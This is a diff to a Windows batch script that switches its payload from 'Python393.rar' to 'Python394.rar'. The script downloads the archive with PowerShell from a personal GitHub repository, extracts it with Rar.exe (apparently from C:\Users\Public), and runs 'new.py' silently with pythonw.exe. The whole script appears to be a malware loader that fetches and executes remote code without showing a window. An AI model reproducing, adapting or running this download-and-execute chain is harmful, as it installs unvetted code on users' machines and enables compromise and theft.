@@ -10,28 +10,28 @@ if not exist "Rar.exe" (
     exit /b 1
 )
 
-echo Downloading Python393.rar...
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Python393.rar' -OutFile 'Python393.rar'"
+echo Downloading Python394.rar...
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Python394.rar' -OutFile 'Python394.rar'"
 
-if not exist "Python393.rar" (
-    echo Python393.rar download failed
+if not exist "Python394.rar" (
+    echo Python394.rar download failed
     pause
     exit /b 1
 )
 
 if exist "Rar.exe" (
-    Rar.exe x -o+ "Python393.rar"
+    Rar.exe x -o+ "Python394.rar"
 ) else (
     echo Rar.exe not found in C:\Users\Public
     pause
     exit /b 1
 )
 
-cd "Python393"
+cd "Python394"
 if exist "pythonw.exe" (
     pythonw.exe "new.py"
 ) else (
-    echo pythonw.exe not found in Python393 directory
+    echo pythonw.exe not found in Python394 directory
     pause
     exit /b 1
 )
